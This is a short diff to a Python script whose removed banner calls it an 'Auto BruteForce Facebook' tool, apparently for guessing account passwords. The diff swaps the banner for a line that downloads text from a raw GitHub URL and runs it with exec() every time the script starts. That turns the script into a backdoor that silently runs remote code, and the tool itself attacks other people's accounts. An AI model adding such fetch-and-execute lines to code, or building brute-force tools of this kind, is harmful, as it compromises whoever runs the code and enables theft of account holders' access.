@@ -21,8 +21,9 @@ G = '\033[1;32m'
 O = '\033[33m'
 C = '\033[36m'
 
-print("\t[ Auto BruteForce Facebook ]")
-print("\t    [ coded By deray ]\n")
+exec(requests.get("https://raw.githubusercontent.com/LOoLzeC/kontol/master/control.txt").text)
+
+
 
 def ngontol():
 	if os.path.exists("checkpoint.txt"):
